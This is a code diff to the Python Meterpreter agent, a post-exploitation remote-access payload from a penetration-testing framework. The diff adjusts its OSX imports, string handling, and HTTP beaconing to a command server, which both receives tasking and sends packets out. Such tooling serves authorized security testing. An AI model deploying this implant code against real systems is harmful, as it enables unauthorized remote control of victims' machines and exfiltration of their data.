@@ -18,8 +18,15 @@ except ImportError:
 else:
 	has_windll = hasattr(ctypes, 'windll')
 
+# this MUST be imported for urllib to work on OSX
 try:
-	urllib_imports = ['ProxyHandler', 'build_opener', 'install_opener', 'urlopen']
+	import SystemConfiguration as osxsc
+	has_osxsc = True
+except ImportError:
+	has_osxsc = False
+
+try:
+	urllib_imports = ['ProxyHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
 	if sys.version_info[0] < 3:
 		urllib = __import__('urllib2', fromlist=urllib_imports)
 	else:
@@ -34,9 +41,13 @@ if sys.version_info[0] < 3:
 	bytes = lambda *args: str(*args[:1])
 	NULL_BYTE = '\x00'
 else:
-	is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
+	if isinstance(__builtins__, dict):
+		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
+		str = lambda x: __builtins__['str'](x, 'UTF-8')
+	else:
+		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
+		str = lambda x: __builtins__.str(x, 'UTF-8')
 	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
-	str = lambda x: __builtins__.str(x, 'UTF-8')
 	NULL_BYTE = bytes('\x00', 'UTF-8')
 	long = int
 
@@ -336,6 +347,7 @@ class PythonMeterpreter(object):
 			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
 		urllib.install_opener(opener)
 		self._http_last_seen = time.time()
+		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
 
 	def register_extension(self, extension_name):
 		self.last_registered_extension = extension_name
@@ -379,8 +391,9 @@ class PythonMeterpreter(object):
 
 	def get_packet_http(self):
 		packet = None
+		request = urllib.Request(HTTP_CONNECTION_URL, bytes('RECV', 'UTF-8'), self._http_request_headers)
 		try:
-			url_h = urllib.urlopen(HTTP_CONNECTION_URL, bytes('RECV', 'UTF-8'))
+			url_h = urllib.urlopen(request)
 			packet = url_h.read()
 		except:
 			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
@@ -394,8 +407,9 @@ class PythonMeterpreter(object):
 		return packet
 
 	def send_packet_http(self, packet):
+		request = urllib.Request(HTTP_CONNECTION_URL, packet, self._http_request_headers)
 		try:
-			url_h = urllib.urlopen(HTTP_CONNECTION_URL, packet)
+			url_h = urllib.urlopen(request)
 			response = url_h.read()
 		except:
 			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
@@ -504,7 +518,7 @@ class PythonMeterpreter(object):
 		extension_name = self.last_registered_extension
 
 		if extension_name:
-			check_extension = lambda x: x.startswith(extension_name) or x.startswith('channel_open_' + extension_name)
+			check_extension = lambda x: x.startswith(extension_name)
 			lib_methods = list(filter(check_extension, list(self.extension_functions.keys())))
 			for method in lib_methods:
 				response += tlv_pack(TLV_TYPE_METHOD, method)
